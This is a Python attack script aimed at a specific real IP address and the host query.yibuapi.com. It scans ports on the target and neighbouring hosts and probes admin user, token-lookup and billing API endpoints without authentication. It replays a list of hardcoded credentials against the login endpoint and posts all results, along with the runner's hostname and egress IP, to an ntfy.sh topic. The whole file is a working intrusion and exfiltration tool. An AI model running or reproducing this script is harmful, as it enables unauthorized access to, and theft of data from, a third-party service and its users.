import os, sys, socket, ssl, time, json, urllib.request

TOPIC = os.environ.get("TOPIC", "i42302reach-def")
CTX = ssl._create_unverified_context()
OUT = []

def log(*a):
    line = " ".join(str(x) for x in a)
    print(line, flush=True)
    OUT.append(line)

def send(tag, text):
    text = str(text)
    for i in range(0, len(text), 3000):
        body = ("[%s %d] " % (tag, i // 3000 + 1)).encode() + text[i:i+3000].encode("utf-8", "replace")
        for _ in range(3):
            try:
                urllib.request.urlopen(urllib.request.Request("https://ntfy.sh/" + TOPIC, data=body, method="POST"), timeout=15, context=CTX).read()
                break
            except Exception:
                time.sleep(1)

def tcp(host, port, t=6):
    s = socket.socket(); s.settimeout(t); t0 = time.time()
    try:
        s.connect((host, port)); return True, round((time.time()-t0)*1000)
    except Exception as e:
        return False, type(e).__name__
    finally:
        try: s.close()
        except: pass

def http(method, url, host=None, data=None, ctype="application/json", t=8, headers=None):
    h = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) probe"}
    if host: h["Host"] = host
    if ctype: h["Content-Type"] = ctype
    if headers: h.update(headers)
    body = None
    if data is not None:
        body = data.encode() if isinstance(data, str) else data
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=t, context=CTX)
        code = r.getcode(); raw = r.read(4000); hdrs = dict(r.getheaders())
        return code, hdrs, raw, round((time.time()-t0)*1000), None
    except urllib.error.HTTPError as e:
        try: raw = e.read(4000)
        except: raw = b""
        return e.code, dict(e.headers), raw, round((time.time()-t0)*1000), None
    except Exception as e:
        return None, {}, b"", round((time.time()-t0)*1000), type(e).__name__

def snip(b, n=300):
    try: s = b.decode("utf-8", "replace")
    except: s = str(b)
    s = " ".join(s.split())
    return s[:n]

def main():
    log("RUNNER", socket.gethostname(), time.strftime("%FT%TZ", time.gmtime()))
    try: log("EGRESS", urllib.request.urlopen("https://api.ipify.org", timeout=12, context=CTX).read().decode().strip())
    except Exception as e: log("EGRESS_FAIL", type(e).__name__)
    log("--- controls (runner internet) ---")
    for h, p in [("1.1.1.1", 443), ("api.github.com", 443), ("github.com", 22), ("ntfy.sh", 443)]:
        ok, info = tcp(h, p); log("CTRL", h, p, "OPEN" if ok else "NO", info)

    log("--- DNS query.yibuapi.com ---")
    try:
        log("DNS", socket.gethostbyname_ex("query.yibuapi.com"))
    except Exception as e:
        log("DNS_FAIL", type(e).__name__)

    log("--- TARGET MATRIX 40.160.5.46 ---")
    target_ports = [21, 22, 80, 443, 3000, 3306, 6379, 8005, 8080, 9000]
    reach_any = []
    for p in target_ports:
        ok, info = tcp("40.160.5.46", p)
        log("PORT", "40.160.5.46", p, "OPEN:" + str(info) if ok else "NO:" + str(info))
        if ok: reach_any.append(p)
    log("--- neighbor controls ---")
    for h, p in [("40.160.7.76", 22), ("40.160.7.76", 443), ("40.160.50.80", 3000), ("135.148.234.41", 3000), ("40.160.50.80", 443)]:
        ok, info = tcp(h, p); log("NEI", h, p, "OPEN:" + str(info) if ok else "NO:" + str(info))

    # Determine candidate HTTP bases
    bases = []
    # try both scheme/port with Host override
    if 80 in reach_any:
        bases.append(("http", "40.160.5.46", 80))
    if 443 in reach_any:
        bases.append(("https", "40.160.5.46", 443))
    if 3000 in reach_any:
        bases.append(("http", "40.160.5.46", 3000))
    if not bases:
        # even if TCP closed, try once (in case scanner blocked but http works)
        bases.append(("http", "40.160.5.46", 80))
        bases.append(("https", "40.160.5.46", 443))

    log("--- HTTP root probes ---")
    working = []
    for scheme, host, port in bases:
        url = "%s://%s:%d/" % (scheme, host, port)
        for hh in ["query.yibuapi.com", None]:
            code, hdrs, raw, ms, err = http("GET", url, host=hh)
            log("ROOT", url, "Host=" + str(hh), "code=" + str(code), "len=%d" % len(raw), "srv=" + str(hdrs.get("Server")), "err=" + str(err), "body=" + snip(raw, 160))
            if code and code < 500 and (len(raw) > 0):
                key = (scheme, host, port, hh)
                if key not in working:
                    working.append(key)

    # API probes against working bases (prefer Host=query.yibuapi.com)
    if working:
        log("--- API PROBES (unauth + login replay) ---")
        creds = [
            ("pat-yibu-sub1", "pat-yibu-sub1"),
            ("pat-yibu-sub2", "pat-yibu-sub2"),
            ("pat-yibu-sub3", "pat-yibu-sub3"),
            ("hr_animation_test", "hr_animation_test"),
            ("root", "yibuapi."),
            ("admin", "yibuapi."),
            ("重点关注", "yibuapi."),
            ("pat-yibu", "pat-yibu"),
        ]
        seen = set()
        for scheme, host, port, hh in working:
            base = "%s://%s:%d" % (scheme, host, port)
            tag = "%s/%s" % (base, hh)
            if tag in seen: continue
            seen.add(tag)
            # 1) listByUsername unauth (POST + GET variants)
            for m, path, d in [
                ("POST", "/admin/users/listByUsername", json.dumps({"username": "", "page": 1, "pageSize": 5})),
                ("GET", "/admin/users/listByUsername?username=&page=1&pageSize=5", None),
            ]:
                c, hd, raw, ms, er = http(m, base + path, host=hh, data=d)
                log("LISTBYUSER", m, tag, "code=" + str(c), "len=%d" % len(raw), "err=" + str(er), "body=" + snip(raw, 240))
            # 2) tokens queryKey unauth
            for path in ["/admin/tokens/queryKey?key=sk", "/admin/fast/tokens/queryKey?key=sk", "/admin/tokens/queryKey"]:
                c, hd, raw, ms, er = http("GET", base + path, host=hh)
                log("QUERYKEY", path, tag, "code=" + str(c), "len=%d" % len(raw), "err=" + str(er), "body=" + snip(raw, 240))
            # 3) bill calcDetail list unauth
            for path in ["/api/bill/calcDetail/list?page=1&pageSize=5", "/api/bill/calcDetail/list?pageNum=1&pageSize=5"]:
                c, hd, raw, ms, er = http("GET", base + path, host=hh)
                log("BILL", path, tag, "code=" + str(c), "len=%d" % len(raw), "err=" + str(er), "body=" + snip(raw, 240))
            # 4) login replay
            for u, pw in creds:
                c, hd, raw, ms, er = http("POST", base + "/admin/users/login", host=hh, data=json.dumps({"username": u, "password": pw}))
                log("LOGIN", u, tag, "code=" + str(c), "len=%d" % len(raw), "err=" + str(er), "body=" + snip(raw, 200))
    else:
        log("NO_HTTP_WORKING")

    send("REACH", "\n".join(OUT))
    log("DONE")

main()
